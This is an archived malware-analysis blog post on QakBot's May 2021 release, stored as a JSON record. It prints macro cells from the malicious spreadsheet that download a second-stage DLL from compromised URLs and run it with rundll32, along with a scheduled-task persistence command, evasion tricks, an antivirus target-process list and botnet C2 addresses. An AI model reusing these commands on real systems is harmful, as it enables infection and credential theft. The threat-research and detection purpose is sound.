{
    "id": "a4e0ad11-641d-42ba-bb0b-5e2265cf4acf",
    "created_at": "2023-01-12T15:04:34.900658Z",
    "updated_at": "2025-03-27T02:05:43.429559Z",
    "deleted_at": null,
    "sha1_hash": "fa8fa20337da9c81a6e4c3bf24fa22de29d2534d",
    "title": "2021-05-04 - A taste of the latest release of QakBot",
    "authors": "",
    "file_creation_date": "2022-05-28T21:48:05Z",
    "file_modification_date": "2022-05-28T21:48:05Z",
    "file_size": 7994236,
    "plain_text": "# A taste of the latest release of QakBot\n\n**[seguranca-informatica.pt/a-taste-of-the-latest-release-of-qakbot](https://seguranca-informatica.pt/a-taste-of-the-latest-release-of-qakbot)**\n\nMay 4, 2021\n\n**A taste of the latest release of QakBot – one of the most popular and mediatic trojan**\n**bankers active since 2007.**\n[The malware QakBot, also known as Qbot, Pinkslipbot, and Quakbot is a banking trojan that](https://malpedia.caad.fkie.fraunhofer.de/details/win.qakbot)\nhas been made headlines since 2007. This piece of malware is focused on stealing banking\ncredentials and victim’s secrets using different techniques tactics and procedures (TTP)\nwhich have evolved over the years, including its delivery mechanisms, C2 techniques, and\nanti-analysis and reversing features.\n\nEmotet is known as the most popular threat distributing QakBot in the wild, nonetheless,\nEmotet has been taken down recently, and QakBot operators are using specially target\ncampaigns to disseminate this threat around the globe. Figure 1 shows two email templates\ndistributing QakBot in Portugal in early May 2021.\n\nAdditionally, QakBot is able to move laterally on the internal environment for stealing\nsensitive data, making internal persistence, or even for deploying other final payloads like\n[ransomware. In recent reports, it could be used to drop other malware such as ProLock and](https://www.hornetsecurity.com/en/security-information/qakbot-malspam-leading-to-prolock/)\nEgregor ransomware. At the moment, and after the Emotet takedown, QakBot becoming one\nthe most prominent and observed threats allowing criminals to gain a foothold on internal\nnetworks. In the next workflow, we can learn how the QakBot infection chain works.\n\n\n-----\n\n**_Figure 2: High-level diagram of QakBot malware and its capabilities._**\n\nQakBot is disseminated these days using target phishing campaigns in several languages,\nincluding Portuguese. The infection chain starts with an URL in the email body that\ndownloads a zip archive containing an XLM or XLSM file (Excel) that takes advantage of\nXLM 4.0 macros to download the 2nd stage from the compromised web servers.\n\nThe 2nd stage – in a form of a DLL with random extension – is loaded into the memory using\nthe DLL injection technique via rundll32.exe Windows utility. After that, the final payload\n(QakBot itself) is loaded in memory and the malicious activity is then initiated. The malware\nis equipped with a list of hardcoded IP addresses from its botnet, and it receives commands\nand updates from the C2 server, including the deployment of additional payloads like\nransomware.\n\n## Dribbling AVs with XLM macros\n\nThe malicious Office document, when opened, it poses as a DocuSign file – a popular\nsoftware for signing digital documents. The malicious documents take advantage of Excel\n4.0 macros (XML macros) stored in hidden sheets that download the QakBot 2nd stage\npayload from the Internet – malicious servers compromised by criminals. Then, the DLL is\nwritten to disk and executed using the DLL injection technique via regsvr32 or rundll32\nutilities\n\n\n-----\n\n**_Figure 3: Excel document used to lure victims and download and execute the QakBot 2nd_**\n_stage._\n\n[According to a publication by ReversingLabs, “among 160,000 Excel 4.0 documents, more](https://blog.reversinglabs.com/blog/spotting-malicious-excel4-macros)\n_than 90% were classified by TitaniumCloud as malicious or suspicious“._\n\n_(…) if you encounter a document that contains XLM macros, it is almost certain that_\n**_its macro will be malicious, RL concluded._**\n\n**Sample Classification** **Count** **Percentage**\n\nGoodware 14458 9.1%\n\nSuspicious 738 0.5%\n\nMalicious 144052 90.4%\n\nTotal 159248 100%\n\n\n-----\n\n**_[Table 1: Classification and distribution of documents containing XLM macros (source).](https://blog.reversinglabs.com/blog/spotting-malicious-excel4-macros)_**\n\nThe malware families detected in the sample set by RL show that ZLoader and Quakbot are\nthe dominant malware families in the Excel 4.0 malware ecosystem.\n\n**_[Figure 4: Malware family distribution using XLM macros in the wild (source).](https://blog.reversinglabs.com/blog/spotting-malicious-excel4-macros)_**\n\n## XLSM file – QakBot loader\n\n**Filename: catalog-1712981442.xlsm**\n\n**MD5: f86c6670822acb89df1eddb582cf0e90**\n\n**Creation time: 2021-04-29 22:18:33**\n\nAn XLSM file is a macro-enabled spreadsheet created by Microsoft Excel, a widely-used\nspreadsheet program included in the Microsoft Office suite. These kinds of files contain\nworksheets of cells arranged by rows and columns as well as embedded macros.\n\nThe compressed Microsoft Excel filenames appear to follow a naming convention beginning\nwith document- or catalog-, followed by several digits and the .xlsm or .xls extension, for\nexample, catalog-1712981442.xlsm.\n\n\n-----\n\nInitially, the Excel document prompts the victim for enabling macros to start the infection\nchain. In detail, the Excel spreadsheet contains hidden spreadsheets – Excel 4.0 macros,\nspreadsheet formulas, and BIFF record all with the goal of passing a wrong visual inspection\nfor the final user and malware analysts.\n\n**_Figure 5: Only the first sheet appears when the XLSM file is opened in order to obfuscate_**\n_the malicious content from the eyes of the malware researchers._\n\nLooking at the internal XML files that are part of the Excel XLSM file, we can easily identify\nthat exist other sheets hidden inside the document, as highlighted in Figure 6.\n\n\n-----\n\n**_Figure 6: Discovering other hidden sheets inside the internal structure of the malicious_**\n_XLSM doc file._\n\nFrom the content highlighted above, we can see the names “Sheet1“, “Sheet2“, “Sheet3”\nand “Sheet4” as the total of sheets available in the document, and also that “Sheet2” will\ntrigger something when the document is opened using the feature “xlnm.Auto_Open” call.\n\nIn short, this type of malicious documents will usually have a cell as “Auto_Open cell”, and\nits functionality is very similar to the “Sub AutoOpen()” function in VBA to automatically run\nmacros when the victim press the “Enable Content” button at the start.\n\nJust a way to confirm we are facing a malicious document, we investigated the internal file:\n**_shareString.xml – which usually contains interesting stuff such as hardcoded strings, URLs,_**\nand so on.\n\n## Bingo!\n\n\n-----\n\n**_Figure 7: Hardcoded URLs used to download the QakBot 2nd stage via URLDownloadtoFile_**\n_call and execute it using rundll32._\n\nFrom this point, we know that the 2nd stage will be downloaded from the previous URLs\nusing the URLDownloadtoFile call, but some content seems a bit obfuscated. This is the\ninteresting part that makes XLM macros a potent initial stage to start malware infection\nchains.\n\nDigging into the details, we can observe that several combinations and operations in\ndocuments cells are performed to concatenate the final string that will execute the QakBot\nDLL (2nd stage) into the memory.\n\n**_Figure 8: Malicious code responsible for starting the QakBot 2nd stage and available on_**\n_several hidden sheets._\n\nPart of the strings extracted from the malicious Excel file are presented below:\n\n\n-----\n\n```\nauto_open: auto_open >Sheet2!$AO$115\nSHEET: Sheet2, Macrosheet\nCELL:AO134  , =SET.VALUE(AY120,AV131&AV132&AV133&AV134&AV135&AV136&AV137&\"2 \"), 1\nCELL:AR125  , =Sheet3!AQ22:AQ22(), 0\nCELL:AO129  ,\n=WORKBOOK.HIDE(\"Sheet2\",1.0)=WORKBOOK.HIDE(\"Sheet3\",1.0)=WORKBOOK.HIDE(\"Sheet4\",1.0),\n1\nCELL:AO127  ,\n=FORMULA(Sheet3!AS39:AS39&Sheet3!AS40:AS40&Sheet3!AS41:AS41&Sheet3!AS42:AS42&Sheet3!AS\n 1\nCELL:AO138  , =SET.VALUE(AY115,AU123), 1\nCELL:AO142  ,\n=FORMULA(AV117&AV118&AY120&Sheet3!AT39:AT39&\"1\"&Sheet2!AY113:AY113&Sheet2!AV139:AV139,\n 1\nCELL:AW148  , =EXEC(\"rundll32 ..\\jordji.nbvt11,DllRegisterServer\"), 33.0\nCELL:AO136  ,\n=SET.VALUE(AY108,Sheet3!AQ39:AQ39&Sheet3!AQ40:AQ40&Sheet3!AQ41:AQ41&Sheet3!AQ42:AQ42&S\n 1\nCELL:AO145  , =AR123()     , 0\nCELL:AW147  , =EXEC(\"rundll32 ..\\jordji.nbvt1,DllRegisterServer\"), 33.0\nCELL:AO135  ,\n=SET.VALUE(AY107,AV123&Sheet2!AV124:AV124&Sheet2!AV125:AV125&Sheet2!AV126:AV126&Sheet2\n 1\nCELL:AO133  ,\n=SET.VALUE(AY118,Sheet3!AR39:AR39&Sheet3!AR40:AR40&Sheet3!AR41:AR41&Sheet3!AR42:AR42&S\n 1\nCELL:AW152  , =Sheet3!AT14:AT14(), 0\nCELL:AT104  , =\"..\\jjoputi.vvt\" , ..\\jjoputi.vvt\nCELL:AO140  ,\n=FORMULA(AV117&AV118&AY120&Sheet3!AT39:AT39&Sheet2!AY113:AY113&Sheet2!AV139:AV139,AW14\n 1\nCELL:AV123  , =CHAR(85.0)    , U\n(...)\nCELL:AT115  , None       ,\nhttps://dentistelmhurstny.com/42te9VZqUDc/hadrt.html\nCELL:AT114  , None       , https://legalopspr.com/BnUwbRV9foc/hartd.html\n(...)\nHEET: Sheet3, Macrosheet\nCELL:AQ27  ,\n=4984654.0+9846544.0+468464.0=CALL(Sheet2!AY107:AY107&\"n\",Sheet2!AY108:AY108&\"A\",Sheet\n 0\nCELL:AT22  , =HALT()      , 1\nCELL:AQ32  , =Sheet2!AW142:AW142(), 0\n\n```\nIn order to understand in detail and reveal the clear source code, we need to learn about the\n**[BIFF8 format. Some details and workarounds were also shared in an old campaign](https://www.openoffice.org/sc/excelfileformat.pdf)**\n[involving the FlawedAmmyy malware here.](https://seguranca-informatica.pt/flawedammyy-leveraging-undetected-xlm-macros-as-an-infection-vehicle/#.YI59ZrVKhPa)\n\n\n-----\n\n[According to the XLM specification by Microsoft available here, all the information about the](https://download.microsoft.com/download/1/A/9/1A96F918-793B-4A55-8B36-84113F275ADD/Excel97-2007BinaryFileFormat(xls)Specification.pdf)\nsheet, including its name, type, and stream position is kept within a BOUNDSHEET record\n(85h). Figure 9 shows how a Sheet type is defined and the Hidden status possible flags:\n\n**00h: visible**\n**01h: hidden**\n**02h: very hidden**\n\n**_Figure 9: BIFF format and BOUNDSHEET information (85h), including sheet type and its_**\n_possible status._\n\nBy analyzing the XLSM document, we can see in Figure 10 that only the first BOUNDSHEET\n**( 0x09 0xF0 0x00 0x00 ) has the hidden status as visible – 0x00h. The other**\n**BOUNDSHEETS are defined as very hidden using the hex value 0x02h.**\n\n\n-----\n\n**_Figure 10: Internal details about the malicious BOUNDSHEETS and hidden states._**\n\nDigging into the details, four BOUNDHSEET records means that the document has four\nsheets, but three of them are very hidden. Using a common HEX editor, we can change the\nvalues and fix the target XLSM file as depicted in Figure 11.\n\n**_Figure 11: Patching the XLSM malicious file to unhide all the sheets._**\n\nAs highlighted above, the values of the last bytes 0x02h and 0x01h were changed to 0x00h\nand 0x00h on the BOUNDSHEET related to Sheet2. The same process was done to the\nother BOUNDSHEETS. By opening again the malicious file, we can see now that all the\nsheets are available and also navigate through the source code spread on random cells.\n\n\n-----\n\n**_Figure 12: Souce code available on the revealed Sheets._**\n\nDuring the code analysis, we found that criminals used another trick to make hard the\nanalysis task. To prevent a casual visual inspection of these values, the font color was set to\nwhite. So, before analyzing the cells, we need to change the document background color or\nthe font color.\n\nBy deobfuscation the formulas and reassembling the strings back to the original form, we\ncan learn how the malicious chain starts:\n\nThe loader uses a VBA CALL statement to access the URLDownloadToFile\nfunction from URLMon.dll to download the 1st stage DLL from the hardcoded\nURLs to the local path (..\\\\) using a random name to the file: **_jordji.nbvt1._**\nNext, the DLL is loaded into the memory using the DLL injection technique via\n_rundll32.exe utility from Windows, allowing code to be executed._\n```\nCALL(URLMon,URLDownloadToFileA,JJCCBB,0,hxxps://dentistelmhurstny.]com/...,..\\\\jordji.\nEXEC(\"rundll32 ..\\jordji.nbvt11,DllRegisterServer\")\n\n## QakBot 2nd stage – the bait loader\n\n```\n\n-----\n\n**Filename: jordji.nbvt11**\n**Original filename: rwenc.dll**\n**MD5: 7d0f6c345cdaf9e290551b220d53cd14**\n**Creation time: 2021-04-13 19:53:55**\n\nThe QakBot 2nd stage is a DLL loaded in memory and its principal mission is:\n\n**Execute in memory the last payload (QakBot itself)**\n**Make hard the malware analysis, seems a legitimate file, and adding**\n**confusion with non-used libraries, calls, and so on.**\n\nAt the first glance, this DLL seems very simple, with just a few calls present on the Import\nAddress Table (IAT). Nonetheless, something caught our eyes, the triple chain:\n**LoadLibraryA, VirtualAlloc, and VirtualProtect. No doubt, we are facing a DLL injection**\ntechnique and another payload is going to be executed in memory.\n\n**_Figure 13: QakBot 2nd stage, its import table (IAT), and the well-known calls used in the_**\n_DLL injection technique._\n\n## Gotcha!\n\n\n-----\n\n**_Figure 14: QakBot final stage dumped from memory._**\n\n## The art of confusion … playing with bins\n\n[In another sample we have analyzed (9b1a02189e9bdf9af2f026d8409c94f7), the process of](https://www.virustotal.com/gui/file/4234445e1e7ae3a364aa22f0cf78f81ef48b1237df828b99622bdd486838f4cb/detection)\ninjecting the last payload into the memory is very similar, but the loader was developed in\nDelphi – a clear sign that criminals are adding additional layers, resources, and features to\nmake hard the QakBot identification and its analysis/detection.\n\n\n-----\n\n**_Figure 15: Identification of Delphi forms and unknown resources (encrypted QakBot DLL)._**\n\nCriminals use multiple loaders like this built-in Delphi language with a lot of junk, GUI forms,\nand native functions from Delphi as a way of deceiving threat detection systems and hidden\nthe last payload from the tentacles of the malware analysts.\n\n**_Figure 16: A lot of Delphi native functions and forms to make hard malware detection._**\n\nThe art of confusion is not new, and several trojans are using this kind of approach in their\n[operations, such as Javali,](https://seguranca-informatica.pt/latin-american-javali-trojan-weaponizing-avira-antivirus-legitimate-injector-to-implant-malware/) **[Grandoreiro, and](https://seguranca-informatica.pt/the-updated-grandoreiro-malware-equipped-with-latenbot-c2-features-in-q2-2020-now-extended-to-portuguese-banks/)** **[URSA, all of them banking trojans that come](https://seguranca-informatica.pt/threat-analysis-the-emergent-ursa-trojan-impacts-many-countries-using-a-sophisticated-loader)**\nfrom Latin American countries.\n\nTake a look at the code, we can find that once again the LoadLibrary call is used to execute\nin memory the last QakBot payload. Figure 17 highlights the parts of the code responsible for\nloading the final payload.\n\n\n-----\n\n**_Figure 17: DLL injection technique used to load the last QakBot payload into the memory._**\n\n## We got it!\n\n**_Figure 18: Dumping from the memory the last stage of QakBot malware._**\n\nThere is no doubt, it is the same payload just compiled on a different date (another release).\n\n\n-----\n\n**_Figure 19: PE information about the QakBot last stage (stager_1.dll)._**\n\n## QakBot last stage – The beast\n\nThe last stage of this chain – QakBot itself – is also a DLL built with Microsoft Visual C++, the\noriginal name is stager_1.dll, and it exports only the function: DllRegisterServer. The easy\nway to identify the last release of the QakBot DLL, it’s looking at the two resources named\n“118” (C2 list) and “524” (bot config) encrypted using the RC4 algorithm.\n\n**_Figure 20: Resources name found in the last release of the QakBot DLL._**\n\nAn interesting detail regarding this new release is that QakBot tries to decrypt the\nconfiguration as usual. Initially, it takes the first 20 bytes of the resource and uses it as the\nRC4 key. After that, it takes 20 bytes from the decrypted blob and uses the bytes as a SHA1\nverification for the rest of the decrypted data.\n\nThe fresh method starts here. Every time the SHA1 validations fail, QakBot tries the new\ndecryption method. In sum, it uses the SHA1 PowerShell path hardcoded inside the binary\nas an RC4 key. This new approach involves the new campaigns: biden, clinton, and tr and\nwas introduced in the 401 major version.\n```\n\\System32\\WindowsPowerShell\\v1 0\\powershell exe\n\n```\n\n-----\n\nYup, [#Qbot](https://twitter.com/hashtag/Qbot?src=hash&ref_src=twsrc%5Etfw) [#Qakbot also changed the resource name that store C2 list and Bot](https://twitter.com/hashtag/Qakbot?src=hash&ref_src=twsrc%5Etfw)\n[configuration. pic.twitter.com/sgxtSMRHJa](https://t.co/sgxtSMRHJa)\n\n[— m4n0w4r (@kienbigmummy) April 19, 2021](https://twitter.com/kienbigmummy/status/1384096254800453647?ref_src=twsrc%5Etfw)\n\n**_Figure 21: Decryption of the botconfig – resource 524._**\n\nSome samples of QakBot trojan are signed PE files with a valid signature issued by several\n[CAs. For example, we can see this sample (cd1ab264088207f759e97305d8bf847d) is](https://www.virustotal.com/gui/file/c6915901fd227f3cbcd77e0ff37ae6fdc09d2b323ed5287b0cdfcb892e37de2a/details)\nsigned by Sectigo – a well-known CA also abused by developers of other kinds of threats in\nthe past.\n\n\n-----\n\n**_Figure 22: QakBot sample with a valid code sign certificate._**\n\nA popular technique used by criminals to make complicated and to waste the reverse\nengineer’s time analyzing is the junk code insertion. In this sense, QakBot is not an\nexception. The malware author added a lot of API calls that alternates between the real\ninstructions – to enlarge the analysis time-consuming and cause disturbing when the\nmalware executes in a sandbox environment.\n\nAnother interesting detail is that the developers of QakBot added a non-standard calling\nconvention that makes it difficult to understand and recognize the real parameters passed to\nthe functions. The common standard calling conventions are cdecl, stdcall, thiscall or\n**fastcall.**\n\n\n-----\n\n**_Figure 23: Main code graph of QakBot malware._**\n\nThe strings inside the QakBot are encrypted, decrypted in run-time, and destroyed after use\n(like the mediatic Emotet). Some of the strings hardcoded inside the DLL are presented\nbelow.\n\n\n-----\n\n**_Figure 24: QakBot hardcoded strings._**\n\nAs observed below, the strings are encrypted and stored in a continuous blob. The\ndecryption function accepts an argument: index to the string; and then XORed it with a\nhardcoded byte array.\n\n\n-----\n\n**_Figure 25: QakBot blob string and decryption XOR block._**\n\nAfter this point, some strings will be decrypted in run-time and also the API functions via a\npre-computed hash based on the API functions that will resolve calls dynamically. More\n[details about this can be found in this great article by the VinCSS blog.](https://blog.vincss.net/2021/03/re021-qakbot-dangerous-malware-has-been-around-for-more-than-a-decade.html)\n\n\n-----\n\n**_[Figure 26: API functions dynamically resolved during the malware execution (source).](https://blog.vincss.net/2021/03/re021-qakbot-dangerous-malware-has-been-around-for-more-than-a-decade.html)_**\n\nAlso important to highlight some anti-debugging and protection mechanisms used by this\npiece of malware. Also stated by VinCSS analysis, “if the victim machine uses Kaspersky\n**_protection (avp.exe process), QakBot will inject code into mobsync.exe instead of_**\n**_explorer.exe.“. We can find more details and target processes in Figure 27 below._**\n\n**_Figure 27: Target process list used by QakBot to execute additional payloads._**\n\nThe full list of target processes can be found below:\n\n\n-----\n\n```\nccSvcHst.exe\navgcsrvx.exe\navgsvcx.exe\navgcsrva.exe\nMsMpEng.exe\nmcshield.exe\navp.exe\nkavtray.exe\negui.exe\nekrn.exe\nbdagent.exe\nvsserv.exe\nvsservppl.exe\nAvastSvc.exe\ncoreServiceShell.exe\nPccNTMon.exe\nNTRTScan.exe\nSAVAdminService.exe\nSavService.exe\nfshoster32.exe\nWRSA.exe\nvkise.exe\nisesrv.exe\ncmdagent.exe\nMBAMService.exe\nByteFence.exe\nmbamgui.exe\nfmon.exe\nwinmail.exe\nwmplayer.exe\noutlook.exe\nexplorer.exe\niexplore.exe\nWerFault.exe\nWerFaultSecure.exe\ntaskhost.exe\nwmiprvse.exe\nsvchost.exe\n\n```\nDuring this analysis, QakBot injected a new payload in the target process “explorer.exe” and\nthen a scheduled task was created as a persistence mechanism using schtasks.exe\nWindows utility.\n```\n\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU \"NT AUTHORITY\\SYSTEM\" /tn vcjscfpqk\n/tr \"regsvr32.exe -s \\\"C:\\Users\\Admin\\AppData\\Local\\Temp\\k.exe.dll\\\"\" /SC ONCE /Z /ST\n01:34 /ET 01:46\n\n```\n\n-----\n\n**_Figure 28: Process flow of the QakBot execution._**\n\nIn addition, the QakBot DLL will be loaded every time using the Register Server utility,\n_regsvr32.exe, with the following parameters:_\n\n**/Create: schedules a new task**\n**/RU “NT AUTHORITY\\\\SYSTEM”: executes the task with elevated system privileges**\n**/tn <RANDOM_STRING>: specifies the task name, seemingly using a random string**\n**/tr “regsvr32.exe -s \\\\”<PAYLOAD>”: the process to be executed, in this case,**\nregsvr32 is passed a malicious dynamic link library (DLL)\n**/SC ONCE: task scheduled to execute once at the specified time**\n**/Z: delete the task upon completion of the schedule**\n**/ST <Now + 3 minutes as hh:mm>: start time, used by the ONCE schedule; and**\n**/ET <Now + 15 minutes as hh:mm>: end time, used by the ONCE schedule.**\n\n## Botnet hardcoded IP Addresses\n\n**Campaign: 1618935072**\n\n**Botnet: tr**\n\n**Version: 402.12**\n\n**URL tria.ge:** [https://tria.ge/210502-aek3yedsfj](https://tria.ge/210502-aek3yedsfj)\n\n\n-----\n\n**_Figure 29: QakBot config – campaign: 1618935072._**\n\nBotnet full list:\n\n\n-----\n\n```\n140.82.49.12:443\n190.85.91.154:443\n96.37.113.36:993\n71.41.184.10:3389\n186.31.46.121:443\n73.25.124.140:2222\n109.12.111.14:443\n24.229.150.54:995\n45.32.211.207:443\n45.77.117.108:443\n45.77.117.108:8443\n149.28.98.196:443\n149.28.98.196:2222\n144.202.38.185:443\n144.202.38.185:995\n45.32.211.207:995\n207.246.116.237:995\n149.28.99.97:995\n45.63.107.192:2222\n149.28.101.90:995\n45.77.115.208:2222\n45.32.211.207:8443\n45.32.211.207:2222\n45.77.115.208:443\n207.246.116.237:443\n45.77.117.108:2222\n149.28.98.196:995\n45.63.107.192:443\n149.28.101.90:8443\n24.152.219.253:995\n149.28.101.90:443\n149.28.101.90:2222\n45.77.115.208:995\n45.77.115.208:8443\n207.246.77.75:8443\n207.246.77.75:2222\n207.246.116.237:2222\n45.77.117.108:995\n149.28.99.97:443\n144.202.38.185:2222\n207.246.77.75:995\n207.246.77.75:443\n207.246.116.237:8443\n24.55.112.61:443\n47.22.148.6:443\n216.201.162.158:443\n197.45.110.165:995\n24.117.107.120:443\n71.163.222.243:443\n189.210.115.207:443\n149.28.99.97:2222\n45.63.107.192:995\n151.205.102.42:443\n75.118.1.141:443\n105.198.236.101:443\n\n```\n\n-----\n\n```\n72.252.201.69:443\n67.8.103.21:443\n136.232.34.70:443\n75.67.192.125:443\n72.240.200.181:2222\n75.137.47.174:443\n78.63.226.32:443\n95.77.223.148:443\n81.97.154.100:443\n105.198.236.99:443\n83.110.109.164:2222\n50.29.166.232:995\n115.133.243.6:443\n27.223.92.142:995\n45.46.53.140:2222\n173.21.10.71:2222\n71.74.12.34:443\n98.252.118.134:443\n76.25.142.196:443\n24.226.156.153:443\n47.196.192.184:443\n67.165.206.193:993\n73.151.236.31:443\n98.192.185.86:443\n24.139.72.117:443\n94.59.106.186:2078\n188.26.91.212:443\n184.185.103.157:443\n172.78.47.100:443\n195.6.1.154:2222\n86.190.41.156:443\n108.14.4.202:443\n24.43.22.219:993\n86.220.62.251:2222\n97.69.160.4:2222\n90.65.236.181:2222\n71.187.170.235:443\n50.244.112.106:443\n96.61.23.88:995\n64.121.114.87:443\n144.139.47.206:443\n222.153.174.162:995\n77.27.207.217:995\n24.95.61.62:443\n77.211.30.202:995\n92.59.35.196:2222\n125.62.192.220:443\n195.12.154.8:443\n68.186.192.69:443\n75.136.40.155:443\n71.117.132.169:443\n96.21.251.127:2222\n71.199.192.62:443\n70.168.130.172:995\n83.196.56.65:2222\n\n```\n\n-----\n\n```\n81.214.126.173:2222\n82.12.157.95:995\n209.210.187.52:995\n209.210.187.52:443\n67.6.12.4:443\n189.222.59.177:443\n174.104.22.30:443\n142.117.191.18:2222\n189.146.183.105:443\n213.60.147.140:443\n196.221.207.137:995\n108.46.145.30:443\n187.250.238.164:995\n2.7.116.188:2222\n195.43.173.70:443\n106.250.150.98:443\n45.67.231.247:443\n83.110.103.152:443\n83.110.9.71:2222\n78.97.207.104:443\n59.90.246.200:443\n80.227.5.69:443\n125.63.101.62:443\n86.236.77.68:2222\n109.106.69.138:2222\n84.72.35.226:443\n217.133.54.140:32100\n197.161.154.132:443\n89.137.211.239:995\n74.222.204.82:995\n122.148.156.131:995\n156.223.110.23:443\n144.139.166.18:443\n202.185.166.181:443\n76.94.200.148:995\n71.63.120.101:443\n196.151.252.84:443\n202.188.138.162:443\n74.68.144.202:443\n69.58.147.82:2078\n\n## Botnet and campaign identifiers\n\n```\nThe following botnet and campaign identifiers have been observed last weeks (since March\n2021) with those behind Qakbot recently using US President names:\n\n\n-----\n\n```\nabc025 1603896786\nbiden01 - 1613753447\nbiden02 - 1614254614\nbiden03 - 1614851222\nbiden09 - 1614939927\nobama07 - 1614243368\nobama08 - 1614855149\nobama09 - 1614939797\ntr - 1614598087\ntr - 1618935072\n\n## Mitre Att&ck Matrix\n\n```\n**Tactic** **ID** **Name** **Description**\n\n\n**Defense Evasion** **[T1027](https://attack.mitre.org/techniques/T1027/)** Obfuscated Files or\nInformation\n\n**Defense Evasion** **[T1027.002](https://attack.mitre.org/techniques/T1027/002/)** Obfuscated Files or\nInformation: Software\nPacking\n\n\nQakBot XLM files are\nobfuscated and sheets are\nhidden.\n\nEvery binary and config is\nobfuscated and encrypted\nusing RC4 cipher.\n\n\n**Execution,**\n**Persistence,**\n**Privilege**\n**Escalation**\n\n**Execution,**\n**Persistence,**\n**Privilege**\n**Escalation**\n\n**Defense Evasion,**\n**Privilege**\n**Escalation**\n\n**Defense Evasion,**\n**Privilege**\n**Escalation**\n\n**Collection,**\n**Credential Access**\n\n\n**[T1053](https://attack.mitre.org/techniques/T1053/)** Scheduled Task/Job QakBot creates tasks to\nmaintain persistence.\n\n\n**[T1056](https://attack.mitre.org/techniques/T1056/)** Input Capture QakBot collects credentials\nand sensitive data from the\nvictim’s devices.\n\n\n**[T1053.005](https://attack.mitre.org/techniques/T1053/005/)** Scheduled Task/Job:\nScheduled Task\n\n\nQakBot uses this TTP as a\nway of executing every time\nthe malicious DLL.\n\n\n**[T1055](https://attack.mitre.org/techniques/T1055/)** Process Injection QakBot uses Process\nInjection to load into the\nmemory some payloads.\n\n\n**[T1055.001](https://attack.mitre.org/techniques/T1055/001/)** Process Injection:\nDynamic-link Library\nInjection\n\n\nDLL injection is used to load\nQakBot via rundll32\nWindows utility.\n\n\n**Discovery** **[T1057](https://attack.mitre.org/techniques/T1057/)** Process Discovery QakBot performs process\ndiscovery.\n\n\n**Discovery** **[T1082](https://attack.mitre.org/techniques/T1082/)** System Information\nDiscovery\n\n\nQakBot obtains the list of\nprocesses and other details.\n\n\n-----\n\n**Discovery, Defense**\n**Evasion**\n\n**Discovery, Defense**\n**Evasion**\n\n\n**[T1497](https://attack.mitre.org/techniques/T1497/)** Virtualization/Sandbox\nEvasion\n\n**[T1497.003](https://attack.mitre.org/techniques/T1497/003/)** Virtualization/Sandbox\nEvasion: Time Based\nEvasion\n\n\nAnti-VM and sandbox\ntechniques are used to\nevade detection.\n\nTime-based evasion is\nchecked during the malware\nrun time.\n\n\n**Discovery** **[T1518](https://attack.mitre.org/techniques/T1518/)** Software Discovery A list of the installed\nsoftware is obtained.\n\n\n**Discovery** **[T1518.001](https://attack.mitre.org/techniques/T1518/001/)** Software Discovery:\nSecurity Software\nDiscovery\n\n## Final Thoughts\n\n\nInstalled AVs and other\nsecurity software are\nobtained.\n\n\nQakBot is a sophisticated trojan designed to collect banking information from victims’\ndevices. This piece of malware is targeting mostly US organizations and it is equipped with a\nvariety of evasion and info-stealing routines as well as worm-like functions to make it\npersistent. In [recent reports, it could be used to drop other malware such as ProLock,](https://www.hornetsecurity.com/en/security-information/qakbot-malspam-leading-to-prolock/)\nEgregor ransomware.\n\nQakBot is a challenging threat with capabilities to avoid dynamic analysis in automatic\nsandboxes with the delayed executions present in its dropper as well as other tricks. With\nthis capability in place, interactive sandboxes, for instance, won’t extract IoCs and artifacts\nfrom the malware easily.\n\nLast but not least, thanks to all the guys who contributed to this analysis and mentioned in\nthe reference section below .\n\n## Yara Rule\n\n\n-----\n\n```\nimport pe \nrule QakBot_May_2021 {\nmeta:\n  description = \"Yara rule for QakBot trojan - May version\"\n  author = \"SI-LAB - https://seguranca-informatica.pt\"\n  last_updated = \"2021-05-04\"\n  tlp = \"white\"\n  category = \"informational\"\n  strings:\n    $ident_a = {69 6E 66 6C 61 74 65}\n    $ident_b = {64 65 66 6C 61 74 65}\n  condition:\n      filesize < 500KB\n      and pe.characteristics & pe.DLL\n    and pe.exports(\"DllRegisterServer\")\n    and all of ($ident_*)  \n}\n\n```\n[Yara rule can be found on GitHub.](https://github.com/sirpedrotavares/SI-LAB-Yara_rules/blob/master/QakBot_May_2021)\n\n## References\n\n[https://blog.reversinglabs.com/blog/spotting-malicious-excel4-macros](https://blog.reversinglabs.com/blog/spotting-malicious-excel4-macros)\n\n[https://any.run/malware-trends/qbot](https://any.run/malware-trends/qbot)\n\n[https://tria.ge/210503-nlv96ly6ee/static1](https://tria.ge/210503-nlv96ly6ee/static1)\n\nhttps://ghoulsec.medium.com/mal-series-12-qakbot-string-decode-with-ghidra-script3ccbf9ca2e5d\n\n[https://blog.cyberint.com/qakbot-ransomware](https://blog.cyberint.com/qakbot-ransomware)\n\n[https://n1ght-w0lf.github.io/malware%20analysis/qbot-banking-trojan/](https://n1ght-w0lf.github.io/malware%20analysis/qbot-banking-trojan/)\n\nhttps://blog.vincss.net/2021/03/re021-qakbot-dangerous-malware-has-been-around-formore-than-a-decade.html\n\n[https://redcanary.com/threat-detection-report/threats/qbot/](https://redcanary.com/threat-detection-report/threats/qbot/)\n\n[Pedro Tavares](https://seguranca-informatica.pt/author/pipocaz/)\n**[Pedro Tavares is a professional in the field of information security working as an Ethical](https://www.linkedin.com/in/sirpedrotavares/)**\nHacker/Pentester, Malware Researcher and also a Security Evangelist. He is also a founding\nmember at CSIRT.UBI and Editor-in-Chief of the security computer blog segurancainformatica.pt.\n\n\n-----\n\nIn recent years he has invested in the field of information security, exploring and analyzing a\nwide range of topics, such as pentesting (Kali Linux), malware, exploitation, hacking, IoT and\nsecurity in Active Directory networks. He is also Freelance Writer (Infosec. Resources\n[Institute and Cyber Defense Magazine) and developer of the 0xSI_f33d – a feed that](https://feed.seguranca-informatica.pt/)\ncompiles phishing and malware campaigns targeting Portuguese citizens.\n\n[Read more here.](https://seguranca-informatica.pt/contacto/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-05-04 - A taste of the latest release of QakBot.pdf"
    ],
    "report_names": [
